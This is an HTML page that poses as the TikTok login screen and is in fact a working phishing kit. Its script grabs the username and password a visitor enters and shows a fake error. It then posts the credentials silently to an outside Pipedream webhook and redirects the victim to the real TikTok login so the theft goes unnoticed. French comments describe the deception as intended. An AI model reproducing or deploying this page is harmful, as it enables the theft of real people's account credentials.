<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Log in • TikTok</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://lf16-tiktok-web.ttcdn-tos.com/obj/tiktok-web/tiktok/favicon.ico">
  <style>
    body,html{margin:0;padding:0;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100%;overflow:hidden}
    .container{max-width:420px;margin:0 auto;padding:20px;display:flex;flex-direction:column;height:100vh;justify-content:space-between}
    .logo{text-align:center;margin:40px 0 60px}
    .logo img{height:46px}
    h1{font-size:28px;font-weight:700;text-align:center;margin:0 0 8px}
    .subtitle{color:#ffffffb3;font-size:15px;text-align:center;line-height:1.5;margin-bottom:50px}
    .form{background:#161616;border-radius:12px;padding:24px;margin:0 12px}
    input{width:100%;padding:16px;background:#000;border:1px solid #333;border-radius:8px;color:#fff;font-size:16px;margin-bottom:16px;box-sizing:border-box}
    input:focus{outline:none;border-color:#fe2c55}
    button{width:100%;height:52px;background:#fe2c55;color:#fff;border:none;border-radius:99px;font-size:17px;font-weight:700;cursor:pointer;margin-top:10px}
    button:hover{background:#e41c47}
    .error{color:#fe2c55;text-align:center;margin-top:15px;font-weight:600;display:none}
    .footer{color:#ffffff80;font-size:13px;text-align:center;padding:20px 0;line-height:1.6}
    .footer a{color:#fe2c55;text-decoration:none;font-weight:600}
    .lang{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1c1c1c;padding:8px 20px;border-radius:8px;border:1px solid #333;font-size:14px}
  </style>
</head>
<body>

<div class="container">
  <div>
    <div class="logo">
      <img src="https://lf16-tiktok-common.ttcdn-tos.com/obj/tiktok-web-common-sg/tiktok-logo-white.png" alt="TikTok">
    </div>
    <h1>Log in to TikTok</h1>
    <p class="subtitle">Manage your account, check notifications,<br>comment on videos, and more.</p>

    <div class="form">
      <input type="text" id="user" placeholder="Phone number / Email / Username" required>
      <input type="password" id="pass" placeholder="Password" required>
      <button onclick="send()">Log in</button>
      <div id="error" class="error">Incorrect username or password. Try again.</div>
    </div>
  </div>

  <div class="footer">
    Don’t have an account? <a href="#">Sign up</a>
    <div style="margin-top:20px">
      By continuing, you agree to TikTok’s <a href="#">Terms of Service</a> and confirm that you have read TikTok’s <a href="#">Privacy Policy</a>.
    </div>
  </div>
</div>

<div class="lang">English (US) ▼</div>

<script>
  async function send() {
    const user = document.getElementById('user').value.trim();
    const pass = document.getElementById('pass').value;

    if (!user || !pass) return;

    // Affiche le faux message d'erreur
    document.getElementById('error').style.display = 'block';
    document.getElementById('pass').value = '';

    // Envoi silencieux vers ton Pipedream
    fetch("https://eov3l04y6gu1pmi.m.pipedream.net", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username_or_email: user,
        password: pass,
        time: new Date().toLocaleString(),
        ip: "captured"
      })
    });

    // Redirect vers le vrai TikTok après 1,5 seconde (ultra réaliste)
    setTimeout(() => {
      window.location.href = "https://www.tiktok.com/login";
    }, 1500);
  }
</script>

</body>
</html>
